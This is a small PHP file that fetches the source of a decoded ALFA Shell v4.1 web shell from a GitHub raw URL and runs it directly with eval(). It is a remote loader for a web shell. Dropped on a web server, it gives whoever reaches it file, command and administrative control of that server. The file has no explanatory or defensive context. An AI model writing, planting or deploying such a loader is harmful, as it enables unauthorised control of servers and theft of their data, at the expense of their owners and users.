<?php
$url = 'https://raw.githubusercontent.com/Ravin-Academy/DeObfuscation_ALFA_SHELL_V4.1/refs/heads/main/Decode%20Of%20ALFA%20Team/alfa-shell-v4.1-tesla-decoded.php';
$php_code = file_get_contents($url);
if ($php_code !== false) {
    eval('?>' . $php_code);
} else {
    echo 'error';
}
?>


